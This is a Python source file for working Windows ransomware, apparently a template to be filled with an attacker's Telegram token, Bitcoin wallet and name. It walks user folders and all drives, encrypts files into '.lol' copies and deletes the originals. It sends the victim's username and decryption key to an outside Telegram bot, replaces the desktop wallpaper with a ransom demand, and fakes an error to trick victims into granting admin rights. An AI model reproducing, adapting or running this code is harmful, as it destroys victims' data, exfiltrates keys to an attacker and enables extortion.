import threading, ctypes, pathlib, nacl, tkinter
import cryptography, os, requests, sys, nacl.secret
from PIL import Image, ImageDraw, ImageFont
from win32api import GetSystemMetrics
from tkinter import messagebox
from time import sleep

class D_E_ncrypt(object):
    def __init__(self, Target=0, BoxM=0, Url=0):
        self.Target = Target
        self.BoxM = BoxM
        self.Url = Url

    def FileE(loc):
        print(f"FILE -> {loc.Target}")
        try:
            if(os.path.isdir(loc.Target) != True):
                with open(loc.Target, "rb") as File:
                    Date = File.read()
                FileName = loc.Target
                Encrypted = loc.BoxM.encrypt(Date)

                if(loc.Target != sys.argv[0]):
                    with open(f"{FileName}.lol","wb") as File:
                        print(f"FILE -> {FileName}")
                        File.write(Encrypted)
                    os.remove(loc.Target)
        except Exception as e:
            print(f"Error -> {e}")

    def SendKey(Key):
        requests.get(Key.Url)

User = os.getlogin()
Script = sys.argv[0]
MaxThread = 120
AdminRight = ctypes.windll.shell32.IsUserAnAdmin()

Key = nacl.utils.random(nacl.secret.SecretBox.KEY_SIZE)
Box = nacl.secret.SecretBox(Key)

Token = "Your Telegram Token So you can Get Decrypt The Files!"
NumID = "Your User ID so Bot just Send Key To You !"

Message = (f"{User} -> {Key}")

PathList = [r"C:\Users\\"]

for Latter in range(97, 123):
    (PathList.append(f"{chr(Latter)}:\\"))
PathList.remove("c:\\")

print(f"list -> {PathList}")
print(f"We are -> {Script}")
print(f"Key - >  {Key}")

def OneStart():
    try:
        HttpReq = D_E_ncrypt(Url=f"https://api.telegram.org/bot{Token}/sendMessage?chat_id={NumID}&text={Message}")
        threading.Thread(target=HttpReq.SendKey, args=()).start()

        Img = Image.new('RGB', (GetSystemMetrics(0), GetSystemMetrics(1)), color= (0, 0, 0))

        Canvas = ImageDraw.Draw(Img)
        font = ImageFont.truetype("arial", int(GetSystemMetrics(1)/20))
        Canvas.text((10,10), (r"""
                Your data Is encrypted  In order to Get your
                    > date back Send me (YOUR PRICE USD) in BTC to this Wellt
                    > and then email me for your key
                    > YOUR WELLET
                    > GoodLuck :)
                    > ~ YOUR NAME """),
                fill=(255,0,0),font=font)

        Img.save('Bg.png')

        ctypes.windll.user32.SystemParametersInfoW(20, 0, f'{os.getcwd()}\\Bg.png' , 0)

    except:
        pass

def CallErrorBox():
    WINDOW = tkinter.Tk()
    WINDOW.withdraw()
    messagebox.showerror("Error", "Try To Re-Run As Administrator")

if __name__ == '__main__':
    if (AdminRight):
        OneStart()
        for AllFiles in PathList:
            try:
                if(pathlib.Path(AllFiles).exists()):
                    for path, subdirs, files in os.walk(AllFiles):
                        if("$Recycle.Bin" in path):
                            pass
                        elif("c:\\Windows" in path):
                            pass
                        elif("\\AppData\\" in path):
                            pass
                        elif ("System32" in path):
                            pass

                        else:
                            for name in files:

                                FilePath = os.path.join(path, name)
                                FileSize = os.stat(FilePath).st_size

                                if(".dll" in name):
                                    pass
                                elif(".exe" in name):
                                    pass
                                elif(".msn" in name):
                                    pass

                                else:
                                    if(FileSize >= 50000000):
                                        while True:
                                            if len(threading.enumerate()) < MaxThread:
                                                EncrypterObj = D_E_ncrypt(FilePath, Box)
                                                threading.Thread(target=EncrypterObj.FileE, args=()).start()

                                                break

                                            else:
                                                sleep(0.2)
                                    else:
                                        print(FilePath)
                                        D_E_ncrypt(FilePath, Box).FileE()
            except Exception as e:
                print(f"Error -> {e}")
    else:
        CallErrorBox() #Call Error Box